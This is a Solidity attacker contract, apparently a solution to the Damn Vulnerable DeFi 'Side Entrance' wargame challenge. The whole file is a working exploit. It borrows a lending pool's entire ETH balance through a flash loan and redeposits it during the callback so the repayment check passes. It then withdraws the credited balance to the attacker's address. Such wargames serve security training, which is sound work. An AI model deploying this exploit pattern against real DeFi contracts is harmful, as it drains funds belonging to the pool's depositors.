// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;
interface ISideEntranceLenderPool {
    function flashLoan(uint256 amount) external;
    function deposit() external payable;
    function withdraw() external;
} 

/**
 * @title SideEntranceLenderPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
 */
contract FlashLoanEtherReceiver {
    ISideEntranceLenderPool pool;
    address attacker;
    uint poolBalance;

    constructor(address _pool) {
        pool = ISideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }

    function execute() external payable {
        pool.deposit{value:poolBalance}();
    }

    function attack() external {
        poolBalance = address(pool).balance;
        pool.flashLoan(poolBalance);
    }

    function withdraw() external {
        pool.withdraw();
        payable(attacker).transfer(address(this).balance);
    }

        // Allow deposits of ETH
    receive () external payable {}
}
 